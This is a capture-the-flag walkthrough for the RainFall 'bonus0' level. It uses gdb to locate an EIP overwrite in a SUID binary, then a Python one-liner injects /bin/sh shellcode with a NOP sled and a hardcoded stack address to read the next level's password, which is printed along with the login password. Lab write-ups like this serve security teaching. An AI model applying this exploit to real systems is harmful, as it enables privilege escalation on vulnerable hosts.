login as the user `bonus0`


```shell
ssh -p 4242 bonus0@10.13.100.153
bonus0@10.13.100.153's password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
```

a `SUID` exactable file is locates in the home directory


```shell
bonus0@RainFall:~$ ./bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
Segmentation fault (core dumped)
```

lets inspect the program with gdb


```gdb
(gdb) b * 0x080485cb    # set a break point the the return of main
Breakpoint 1 at 0x80485cb
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���

Breakpoint 1, 0x080485cb in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

looks like `eip` was overwritten by B's

```gdb
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -
B1B2B3B4B5B6B7B8B9B10B11B12B13B14B15B16
AAAAAAAAAAAAAAAAAAAAB1B2B3B4B5B6B7B8B9B1��� B1B2B3B4B5B6B7B8B9B1���

Breakpoint 1, 0x080485cb in main ()
(gdb) C
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42364235 in ?? ()
(gdb)
```

```shell
bonus0@RainFall:~$ python -c "print '42364235'.decode('hex')"
B6B5
```
the value `5B6B` is located at the 9th index of the second input, what will be where we insert the start address of out malicious code

the program defines the function `p` the reads from stdin to a buffer of size `4096`. the input is read using the `read` c function with dose not insert a null byte at the end of the string. also  `strncpy` will not null terminate the destination string is the number of copied characters are less or equal then the number of the source string.
we can insert shell code at the start of the first input to exploit the program.


<!-- "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" -->
```shell
bonus0@RainFall:~$ (python -c "print '\x90' * 50 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' "; python -c "print 'A' * 9 + '\xa0\xe6\xff\xbf' + 'A' * 8 "; cat) | /home/user/bonus0/bonus0
 -
 -
��������������������AAAAAAAAA����AAAAAAA��� AAAAAAAAA����AAAAAAA���
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

